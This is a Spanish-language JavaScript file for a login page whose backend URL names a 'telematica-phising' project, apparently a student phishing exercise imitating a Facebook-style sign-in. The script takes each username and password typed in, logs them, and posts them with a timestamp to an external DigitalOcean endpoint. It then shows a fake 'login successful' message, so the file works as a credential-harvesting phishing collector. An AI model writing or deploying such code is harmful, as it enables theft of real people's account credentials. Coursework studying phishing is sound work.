// URL del backend API - se configura automáticamente según el entorno
const API_BASE_URL = 'https://final-telematica-phising-jy3t3.ondigitalocean.app/proyecto-final-telematica-backen/api';
    

// Elementos del DOM
const loginForm = document.getElementById('loginForm');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

// Función para mostrar mensajes al usuario
function showMessage(message, type = 'info') {
    // Crear elemento de mensaje
    const messageDiv = document.createElement('div');
    messageDiv.className = `message message-${type}`;
    messageDiv.textContent = message;
    
    // Estilos del mensaje
    messageDiv.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 6px;
        color: white;
        font-weight: bold;
        z-index: 1000;
        max-width: 300px;
        word-wrap: break-word;
        ${type === 'success' ? 'background: #42b883;' : 
          type === 'error' ? 'background: #e74c3c;' : 
          'background: #1877f2;'}
    `;
    
    // Agregar al DOM
    document.body.appendChild(messageDiv);
    
    // Remover después de 5 segundos
    setTimeout(() => {
        if (messageDiv.parentNode) {
            messageDiv.parentNode.removeChild(messageDiv);
        }
    }, 5000);
}

// Función para validar el formulario
function validateForm(username, password) {
    if (!username.trim()) {
        showMessage('Por favor ingresa tu correo electrónico o número de teléfono', 'error');
        return false;
    }
    
    if (!password.trim()) {
        showMessage('Por favor ingresa tu contraseña', 'error');
        return false;
    }
    
    if (password.length < 6) {
        showMessage('La contraseña debe tener al menos 6 caracteres', 'error');
        return false;
    }
    
    return true;
}

// Función para enviar datos al backend
async function sendLoginRequest(loginData) {
    try {
        console.log('Enviando request a:', `${API_BASE_URL}/login`);
        console.log('Datos a enviar:', loginData);
        
        const response = await fetch(`${API_BASE_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(loginData)
        });
        
        if (!response.ok) {
            const errorData = await response.text();
            throw new Error(errorData || `Error ${response.status}`);
        }
        
        const result = await response.json();
        return result;
    } catch (error) {
        console.error('Error al conectar con el backend:', error);
        throw error;
    }
}

// Función para manejar el submit del formulario
async function handleLogin(event) {
    event.preventDefault();
    
    const username = usernameInput.value.trim();
    const password = passwordInput.value.trim();
    
    // Validar formulario
    if (!validateForm(username, password)) {
        return;
    }
    
    // Deshabilitar el botón de submit mientras se procesa
    const submitButton = loginForm.querySelector('.login-btn');
    const originalText = submitButton.textContent;
    submitButton.disabled = true;
    submitButton.textContent = 'Iniciando sesión...';
    
    try {
        // Preparar datos para enviar
        const loginData = {
            username: username,
            password: password,
            loginTime: new Date().toISOString()
        };
        
        // Enviar petición al backend
        const result = await sendLoginRequest(loginData);
        
        // Mostrar mensaje de éxito
        showMessage(`¡Bienvenido ${result.username}! Login exitoso`, 'success');
        
        // Limpiar formulario
        loginForm.reset();
        
        // Aquí podrías redirigir a otra página o actualizar la UI
        console.log('Respuesta del servidor:', result);
        
    } catch (error) {
        // Mostrar mensaje de error
        if (error.message.includes('fetch')) {
            showMessage('No se pudo conectar con el servidor. Verifica que el backend esté ejecutándose.', 'error');
        } else {
            showMessage(`Error de login: ${error.message}`, 'error');
        }
        console.error('Error en login:', error);
    } finally {
        // Restaurar el botón
        submitButton.disabled = false;
        submitButton.textContent = originalText;
    }
}

// Función para probar la conexión con el backend
async function testBackendConnection() {
    try {
        console.log('Probando conexión con:', `${API_BASE_URL}/login/status`);
        const response = await fetch(`${API_BASE_URL}/login/status`);
        console.log('Response status:', response.status);
        
        if (response.ok) {
            const data = await response.json();
            console.log('Backend conectado:', data);
            return true;
        } else {
            console.log('Backend responde pero con error:', response.status);
            return false;
        }
    } catch (error) {
        console.log('Backend no disponible:', error.message);
        return false;
    }
}

// Event listeners
document.addEventListener('DOMContentLoaded', function() {
    // Verificar conexión con backend al cargar la página
    testBackendConnection().then(connected => {
        if (!connected) {
            console.warn('Advertencia: No se pudo conectar con el backend. Asegúrate de que esté ejecutándose.');
        }
    });
    
    // Agregar event listener al formulario
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }
    
    // Efectos visuales adicionales
    
    // Efecto focus en inputs
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.style.transform = 'scale(1.02)';
            this.style.transition = 'transform 0.2s ease';
        });
        
        input.addEventListener('blur', function() {
            this.style.transform = 'scale(1)';
        });
    });
    
    // Efecto hover en botones
    const buttons = document.querySelectorAll('button');
    buttons.forEach(button => {
        button.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-1px)';
            this.style.transition = 'transform 0.2s ease';
        });
        
        button.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0)';
        });
    });
});

// Manejar el botón "Crear cuenta nueva"
document.addEventListener('DOMContentLoaded', function() {
    const createAccountBtn = document.querySelector('.create-account-btn');
    if (createAccountBtn) {
        createAccountBtn.addEventListener('click', function() {
            showMessage('Funcionalidad de crear cuenta en desarrollo', 'info');
        });
    }
}); 